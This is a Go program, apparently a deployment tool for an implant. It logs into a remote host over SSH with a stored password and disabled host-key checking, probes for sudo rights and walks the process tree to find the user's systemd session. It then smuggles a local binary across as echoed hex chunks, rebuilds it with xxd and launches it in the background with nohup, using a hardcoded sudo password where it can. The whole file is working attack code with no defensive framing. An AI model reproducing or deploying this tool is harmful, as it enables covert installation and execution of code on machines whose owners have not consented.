package main

import (
	"bufio"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	vars "test/VARS"
	"time"

	"github.com/BurntSushi/toml"
	"golang.org/x/crypto/ssh"
)

var confa vars.Config
var isSudo bool
var PidToStart string
var stringOFpidToStart string
var commands []string
var Pids []string
var Search = true
var SId string
var StrResult strings.Builder

// var base64PidToStart string

func init() {
	if _, err := toml.DecodeFile("config.toml", &confa); err != nil {
		log.Fatal(err)
	}
}

func main() {

	filePath := "../client/main" // replace with your file path
	configFile := "config.toml"
	bfFile := "test.csv"

	// SSH client configuration
	config := &ssh.ClientConfig{
		User: confa.Client.User,
		Auth: []ssh.AuthMethod{
			ssh.Password(confa.Client.Pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Connect to the remote host
	hostPort := fmt.Sprintf("%s:%s", confa.Client.Host, confa.Client.Port)
	client, err := ssh.Dial("tcp", hostPort, config)
	if err != nil {
		log.Fatalf("Failed to dial: %s", err)
	}
	defer client.Close()

	// Create a new session
	session, err := client.NewSession()
	if err != nil {
		log.Fatalf("Failed to create session: %s", err)
	}

	defer session.Close()

	stdin, err := session.StdinPipe()
	if err != nil {
		log.Fatalf("Failed to create stdin pipe: %s", err)
	}
	stdout, err := session.StdoutPipe()
	if err != nil {
		log.Fatalf("Unable to setup stdout for session: %s", err)
	}
	defer stdin.Close()

	// Start the session shell
	err = session.Shell()
	if err != nil {
		log.Fatalf("Failed to start shell: %s", err)
	}
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			Result := scanner.Text()
			patern := fmt.Sprintf(`\b%s\b.*\bsudo\b|\bsudo\b.*\b%s\b`, confa.Client.User, confa.Client.User)
			paternNumber := `\b\d{4,}\b`
			paternSessionID := `^/run/systemd/sessions/\d{1,3}$`
			paternPPid := `PPid:`
			re := regexp.MustCompile(patern)

			if re.MatchString(Result) {
				isSudo = true
			}
			renum := regexp.MustCompile(paternNumber)
			if renum.MatchString(Result) {
				if !strings.Contains(Result, "PPid:") {
					Pids = append(Pids, Result)
					// stringOFpidToStart = fmt.Sprintf("\nPidToStart = \"%s\"", Result)
				}
			}
			reppid := regexp.MustCompile(paternPPid)
			if reppid.MatchString(Result) {
				x := strings.Split(Result, "\t")
				Pids = append(Pids, x[1])
			}
			resess := regexp.MustCompile(paternSessionID)
			if resess.MatchString(Result) {
				SId = filepath.Base(Result)
			}
		}
	}()

	_, err = stdin.Write([]byte("groups $USER\n"))
	_, err = stdin.Write([]byte("echo $$\n"))
	time.Sleep(1 * time.Second)
	trimmed := ""
	for Search {

		c := fmt.Sprintf("cat /proc/%s/status | grep PPid\n", Pids[len(Pids)-1])

		_, err = stdin.Write([]byte(c))
		time.Sleep(1 * time.Second)
		if Pids[len(Pids)-1] == "1" || Pids[len(Pids)-1] == "0" {
			Search = false
			StrResult.WriteString("LEADER=(")
			for i, num := range Pids {
				if i > 0 {
					StrResult.WriteString(fmt.Sprintf("%s", num))
					StrResult.WriteString("|") // Add the separator between elements
				}
			}
			trimmed = strings.TrimSuffix(StrResult.String(), "|")
			trimmed = trimmed + ")"
		}

	}

	sessionID := fmt.Sprintf("grep -l --exclude=\"*.ref\" -E \"%s\"  /run/systemd/sessions/* 2>/dev/null \n", trimmed)

	time.Sleep(1 * time.Second)
	_, err = stdin.Write([]byte(sessionID))
	fmt.Println("END WAITING")

	time.Sleep(1 * time.Second)
	files := []string{configFile, bfFile}
	StringToSend := []string{}
	fileData := OpenAndReadFiles(filePath)

	hexString := hex.EncodeToString(fileData)
	z := splitString(hexString, 100000)

	for i, file := range files {
		fileData := OpenAndReadFiles(file)
		if i == 0 {
			something := fmt.Sprintf("\n\tSessionId=%s\n", SId)
			str := strings.Join(Pids, "|")
			seconfSomething := fmt.Sprintf("\tPids=\"%s\"", str)
			fileData = append(fileData, []byte(something)...)
			fileData = append(fileData, []byte(seconfSomething)...)
		}
		encodedString := base64.StdEncoding.EncodeToString(fileData)

		fmt.Println(encodedString)
		StringToSend = append(StringToSend, encodedString)
	}
	time.Sleep(2 * time.Second)
	if err != nil {
		log.Fatalf("Failed to send command: %s", err)
	}

	for _, chunk := range z {
		commands = append(commands, fmt.Sprintf("echo \"%s\" >> skata.txt \n", chunk))
		// fmt.Println(i)
	}
	// isSudo = false
	commands = append(commands, "xxd -r -p skata.txt > output_skata \n")
	commands = append(commands, "chmod +x output_skata \n")
	commands = append(commands, fmt.Sprintf("echo \"%s\" >> %s \n", StringToSend[0], configFile))

	// commands = append(commands, fmt.Sprintf("echo \"%s\" >> %s \n", base64PidToStart, configFile))

	commands = append(commands, fmt.Sprintf("echo \"%s\" >> %s \n", StringToSend[1], bfFile))

	// isSudo = false
	if isSudo {
		fmt.Println("IS SUDO")
		// commands = append(commands, "echo 1234 | sudo -S nohup sleep 20 > /dev/null 2>&1 &\n") //TODO change that to product
		commands = append(commands, "bash -c 'echo 1234 | sudo -S nohup ./output_skata &' \n")
	} else {
		fmt.Println("JUST USER")
		// commands = append(commands, "nohup  sleep 20 > /dev/null 2>&1 & \n") //TODO change that to product
		commands = append(commands, "bash -c 'nohup ./output_skata &' \n")
	}

	for i, command := range commands {
		fmt.Println("Sending Command :", i, "from", len(commands))
		_, err = stdin.Write([]byte(command))
		if err != nil {
			log.Fatalf("Failed to send command: %s", err)
		}
		if i > len(commands)-6 {
			fmt.Println(command)
		}
		time.Sleep(200 * time.Millisecond)
	}
	time.Sleep(50 * time.Second)
	// err = session.Wait()
	stdin.Close()
	err = session.Close()

	if err != nil {
		log.Fatalf("Failed to wait for session: %s", err)
	}
	fmt.Println("END")

}

func splitString(str string, size int) []string {
	var chunks []string
	for i := 0; i < len(str); i += size {
		end := i + size
		if end > len(str) {
			end = len(str)
		}
		chunks = append(chunks, str[i:end])
	}
	return chunks
}

func OpenAndReadFiles(filepath string) []byte {

	file, err := os.Open(filepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	// Read the file content
	fileContent, err := io.ReadAll(file)
	if err != nil {
		log.Fatal(err)
	}
	return fileContent
}
